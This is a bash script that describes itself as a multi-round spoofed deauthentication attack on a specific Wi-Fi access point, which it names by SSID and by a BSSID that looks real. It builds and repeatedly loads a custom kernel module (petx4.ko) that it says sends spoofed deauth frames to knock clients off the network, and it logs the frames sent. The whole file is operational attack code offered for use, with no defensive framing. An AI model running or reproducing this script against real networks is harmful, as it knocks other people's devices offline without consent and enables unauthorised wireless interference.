#!/bin/bash
# deauth_pe_multi.sh - Multi-round spoofed deauth attack
# Sends repeated spoofed deauths to kick clients off target AP
#
# Usage: sudo bash /tmp/deauth_pe_multi.sh [rounds]

ROUNDS=${1:-5}
TARGET_SSID="不想上班"
TARGET_BSSID="04:67:61:D6:DC:92"
TARGET_BSSID_LC="04:67:61:d6:dc:92"
HOME_SSID="9899a5b77"

echo "[*] Spoofed deauth attack - $ROUNDS rounds"
echo "[*] Target: $TARGET_SSID ($TARGET_BSSID)"

# Pre-build
cd /tmp
[ -f petx4.ko ] || { as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o; }

# Create target profile once
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
nmcli connection add type wifi con-name "$TARGET_SSID" \
    ssid "$TARGET_SSID" \
    wifi-sec.key-mgmt wpa-psk \
    wifi-sec.psk "dummypassword12345678" \
    802-11-wireless.bssid "$TARGET_BSSID" 2>/dev/null
echo "[*] Profile ready"

DEAUTH_COUNT=0

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "[*] === Round $round/$ROUNDS ==="

    # Disconnect current
    nmcli connection down "$HOME_SSID" 2>/dev/null || true
    sleep 0.3

    # Connect to target
    nmcli connection up "$TARGET_SSID" 2>/dev/null &
    PID=$!

    # Poll for connection
    OK=0
    for i in $(seq 1 100); do
        if dmesg | tail -3 | grep -q "connected to $TARGET_BSSID_LC"; then
            OK=1
            break
        fi
        sleep 0.1
    done

    if [ $OK -eq 0 ]; then
        echo "    Connection failed, skipping"
        kill $PID 2>/dev/null
        wait $PID 2>/dev/null
        continue
    fi

    echo "    Connected to target AP"

    # Load petx4 module (sends 1 spoofed deauth)
    rmmod kfind 2>/dev/null || true
    insmod /tmp/petx4.ko 2>/dev/null
    RC=$?

    if [ $RC -eq 0 ]; then
        DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
        echo "    Deauth #$DEAUTH_COUNT sent!"
    fi

    # Wait a moment, unload
    sleep 0.3
    rmmod kfind 2>/dev/null || true

    # Try to load again for a second deauth (if session still alive)
    insmod /tmp/petx4.ko 2>/dev/null
    if [ $? -eq 0 ]; then
        DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
        echo "    Deauth #$DEAUTH_COUNT sent!"
        sleep 0.2
        rmmod kfind 2>/dev/null || true
    fi

    # Cleanup
    kill $PID 2>/dev/null
    wait $PID 2>/dev/null
    sleep 0.5
done

echo ""
echo "[*] Attack complete: $DEAUTH_COUNT spoofed deauths sent in $ROUNDS rounds"

# Show deauth TX log
echo "[*] PE Deauth TX log:"
dmesg | grep "Deauth TX.*04:67:61" | tail -20

# Reconnect home
echo "[*] Reconnecting home..."
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
nmcli connection up "$HOME_SSID" 2>/dev/null || true
sleep 3
echo "[*] Status:"
nmcli connection show --active | head -5
echo "[*] Done."
